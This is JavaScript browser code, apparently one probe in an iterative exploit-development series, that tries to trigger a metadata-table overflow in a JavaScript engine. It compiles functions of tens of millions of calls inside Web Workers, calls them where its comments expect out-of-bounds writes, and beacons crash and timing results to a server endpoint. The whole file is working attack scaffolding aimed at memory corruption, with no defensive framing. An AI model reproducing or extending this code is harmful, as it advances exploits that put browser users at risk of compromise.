// p137 — MetadataTable overflow: FREE VARIABLE compile + call in Worker
// FIXES from p135:
//   1. No 'return' at Worker top-level (causes SyntaxError)
//   2. W6 was param not free-var — CORRECTED
//   3. Define 'a' in Worker scope before calling
// Tests free-var at 22.5M, 25M, 27M — if T>=191B, 22.5M overflows
// Tests param at 22.5M as calibration
// TextDecoder for efficient string building
// Beacon prefix: V137O-
(function(){
var rid='v137o'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V137O-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V137O-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe137-start');

function runWorkerTest(testName,workerCode,timeoutMs){
  return new Promise(function(resolve){
    var result={test:testName};
    var t0=Date.now();
    try{
      var blob=new Blob([workerCode],{type:'application/javascript'});
      var url=URL.createObjectURL(blob);
      var w=new Worker(url);
      var done=false;
      w.onmessage=function(e){
        if(done)return;
        var d=e.data;
        if(d.type==='progress'){
          result[d.phase]=d.value;
          beacon(testName+'-P',d.phase+':'+JSON.stringify(d.value));
        }else if(d.type==='done'){
          done=true;
          result.wr=d.value;
          result.survived=true;
          result.totalTime=Date.now()-t0;
          w.terminate();
          URL.revokeObjectURL(url);
          resolve(result);
        }
      };
      w.onerror=function(e){
        if(done)return;
        done=true;
        result.crashed=true;
        result.errorMsg=e.message?String(e.message).slice(0,200):'unknown';
        result.errorLine=e.lineno;
        result.totalTime=Date.now()-t0;
        try{w.terminate();}catch(x){}
        URL.revokeObjectURL(url);
        resolve(result);
      };
      setTimeout(function(){
        if(done)return;
        done=true;
        result.timedOut=true;
        result.totalTime=Date.now()-t0;
        try{w.terminate();}catch(x){}
        URL.revokeObjectURL(url);
        resolve(result);
      },timeoutMs||180000);
    }catch(e){
      result.setupErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      resolve(result);
    }
  });
}

function makeWorkerCode(N, useParam){
  // Build string via TextDecoder (memory efficient)
  // If useParam: new Function('a',src) — param access
  // If !useParam: new Function(src) — 'a' is free variable
  // After compile: define 'a' in Worker scope and CALL the function
  var paramLine=useParam?
    "var fn=new Function('a',src);":
    "var fn=new Function(src);";
  var callSetup=useParam?
    "var cc=0;fn(function(){cc++;if(cc>5)throw new Error('PSTOP');});":
    "self.a=function(){cc++;if(cc>5)throw new Error('PSTOP');};fn();";

  return [
    "self.postMessage({type:'progress',phase:'start',value:Date.now()});",
    "(function(){",
    "var N="+N+";",
    "var t0=Date.now();",
    "var buf=new Uint8Array(N*4);",
    "for(var i=0;i<buf.length;i+=4){buf[i]=97;buf[i+1]=40;buf[i+2]=41;buf[i+3]=59;}",
    "var fillMs=Date.now()-t0;",
    "self.postMessage({type:'progress',phase:'fill',value:{len:buf.length,ms:fillMs}});",
    "var td=Date.now();",
    "var src=new TextDecoder().decode(buf);",
    "buf=null;",
    "var decMs=Date.now()-td;",
    "self.postMessage({type:'progress',phase:'dec',value:{len:src.length,ms:decMs}});",
    "var tc=Date.now();",
    "try{",
    paramLine,
    "}catch(e){",
    "  self.postMessage({type:'done',value:{compileErr:e.constructor.name+':'+String(e.message||'').slice(0,120),n:N}});",
    "  self.close();",
    "}",
    "var compMs=Date.now()-tc;",
    "src=null;",
    "self.postMessage({type:'progress',phase:'cmp',value:{ms:compMs}});",
    "// Free memory",
    "for(var g=0;g<20;g++){var t=new ArrayBuffer(4194304);t=null;}",
    "// CALL the function — this is where OOB writes happen if overflow occurred",
    "self.postMessage({type:'progress',phase:'call',value:'starting'});",
    "var cc=0;",
    "try{",
    callSetup,
    "}catch(e){",
    "  if(e.message==='PSTOP'){",
    "    self.postMessage({type:'done',value:{compiled:true,called:true,callOK:true,cc:cc,n:N,param:"+useParam+",compMs:compMs,fillMs:fillMs,decMs:decMs}});",
    "    self.close();",
    "  }",
    "  self.postMessage({type:'done',value:{compiled:true,called:true,callErr:e.constructor.name+':'+String(e.message||'').slice(0,120),cc:cc,n:N,param:"+useParam+",compMs:compMs}});",
    "  self.close();",
    "}",
    "self.postMessage({type:'done',value:{compiled:true,called:true,noThrow:true,cc:cc,n:N,param:"+useParam+",compMs:compMs}});",
    "self.close();",
    "})();"
  ].join('\n');
}

var tests=[
  // FREE VARIABLE — these may overflow if T>=191B/iter at 22.5M
  {name:'FV-22M5',n:22500000,param:false,timeout:180000},
  // PARAM calibration — should NOT overflow (only op_call metadata)
  {name:'PM-22M5',n:22500000,param:true,timeout:180000},
  // FREE VARIABLE higher N — if 22.5M doesn't overflow, try 25M
  {name:'FV-25M',n:25000000,param:false,timeout:240000},
  // FREE VARIABLE even higher — if T=160B, need 27M
  {name:'FV-27M',n:27000000,param:false,timeout:300000}
];

async function runAll(){
  for(var i=0;i<tests.length;i++){
    var t=tests[i];
    beacon(t.name+'-PRE','n='+t.n+',param='+t.param);
    var code=makeWorkerCode(t.n,t.param);
    var result=await runWorkerTest(t.name,code,t.timeout);
    beacon(t.name,JSON.stringify(result).slice(0,900));
    // GC between tests
    for(var g=0;g<30;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
    await new Promise(function(r){setTimeout(r,8000);});
    for(var g2=0;g2<30;g2++){var tmp2=new ArrayBuffer(4194304);tmp2=null;}
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
